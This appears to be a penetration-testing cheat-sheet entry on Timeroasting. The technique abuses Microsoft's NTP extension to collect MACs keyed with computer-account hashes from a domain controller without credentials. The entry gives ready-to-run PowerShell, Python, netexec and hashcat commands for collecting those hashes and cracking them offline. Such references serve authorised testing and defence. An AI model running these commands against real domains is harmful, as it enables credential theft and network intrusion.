---
technique: Timeroast
category: kerberos
targets: Computer accounts, Trust accounts
protocols: NTP
remote_capable: true
tags: kerberos timeroast ntp sntp computer-accounts cracking unauthenticated ad
---

# Timeroast

Microsoft's NTP extension authenticates time responses using a MAC keyed with the computer account's NTLM hash. Any unauthenticated client can send an NTP request specifying an arbitrary RID, and the DC will respond with a MAC computed from that account's hash. Timeroasting iterates RIDs to collect those MACs and cracks them offline. Unlike Kerberoasting, no domain credentials are required for the initial collection phase.

## Windows

### Invoke-AuthenticatedTimeRoast

#powershell #authenticated #rid-mapping

Perform authenticated Timeroasting with automatic RID-to-hostname mapping via AD queries.

```powershell title:"Authenticated Timeroast with RID-to-hostname resolution"
Invoke-AuthenticatedTimeRoast -DomainController "$rhost_ip"
```
<!-- cheat
import domain_ip
-->

## Linux

### timeroast.py

#python #unauthenticated #ntp

Extract computer account SNTP hashes unauthenticated by enumerating RIDs over NTP.

```sh title:"Unauthenticated Timeroast via NTP RID enumeration"
python3 timeroast.py "$rhost_ip"
```
<!-- cheat
import domain_ip
-->

### netexec (timeroast module)

#smb #unauthenticated #module

Run the netexec Timeroast module to collect SNTP hashes without authentication.

```sh title:"Timeroast via netexec SMB module (no creds required)"
nxc smb "$rhost_ip" -M timeroast
```
<!-- cheat
import domain_ip
-->

### hashcat

#cracking #offline

Crack SNTP hashes with hashcat mode 31300 (requires hashcat v7.1.2+); use `--username` when the file contains RIDs as usernames.

```sh title:"Crack SNTP hashes with hashcat mode 31300"
hashcat -m 31300 -a 0 -O hashes.txt "$wordlist" --username
```
<!-- cheat
var wordlist
-->
